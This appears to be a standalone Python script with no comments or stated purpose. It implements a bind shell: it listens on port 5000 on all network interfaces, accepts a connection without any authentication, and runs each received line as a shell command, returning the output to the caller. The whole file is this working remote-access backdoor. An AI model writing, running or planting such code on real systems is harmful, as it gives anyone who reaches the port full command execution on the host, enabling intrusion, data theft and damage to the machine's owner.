import socket
import subprocess

HOST = "0.0.0.0"
PORT = 5000

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print(f"Server listening on port {PORT}...")

conn, addr = server.accept()
print("Client connected:", addr)

while True:
    data = conn.recv(4096).decode()

    if not data:
        break

    if data.strip().lower() == "exit":
        break

    try:
        result = subprocess.run(
            data,
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )

        output = result.stdout + result.stderr

    except Exception as e:
        output = f"Error: {e}"

    conn.sendall(output.encode())

conn.close()
server.close()
